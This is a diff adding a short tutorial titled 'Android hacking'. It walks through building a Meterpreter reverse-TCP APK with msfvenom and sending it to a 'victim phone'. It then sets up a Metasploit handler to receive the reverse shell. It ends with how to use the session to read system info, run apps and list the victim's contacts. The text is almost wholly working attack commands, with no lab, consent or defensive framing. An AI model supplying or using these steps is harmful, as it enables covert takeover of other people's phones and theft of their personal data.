@@ -1,0 +1,49 @@
+Android hacking
+
+1)	 First Create a Payload :- 
+
+Command :- 
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST= 192.168.0.130 LPORT=4444 R > avenger.apk
+
+	Send this payload(apk) in victim phone and download file in it.
+
+2)	 Start the meta exploit frame :- 
+
+ Command :- 
+	sudo msfconsole
+
+3)	 Use exploit :- 
+
+Command :-
+use exploit/multi/handler
+
+4)	Set payload :- 
+
+Command :-
+	set PAYLOAD android/meterpreter/reverse_tcp
+
+5)	Check the whether LHOST and LPORT is set or not, if not then set them :- 
+
+Command :-
+
+show options
+
+if LHOST is not set then do it By this below command :-
+set LHOST 192.168.0.130
+
+6)	Access the control of phone :-
+
+Command :-
+
+exploit
+
+Then wait till the victim install the payload (app) in the phone.
+After installing app in phone, we get access the control of phone and start the session in kali linux.
+Now, We can do many process on the phone through kali linux. Go the help command, it’s show many command which we can do such as we can know about system info , we can run any app and we can know list of contact no, which are stored in phone.
+ 
+
+
+
+ 
+
+
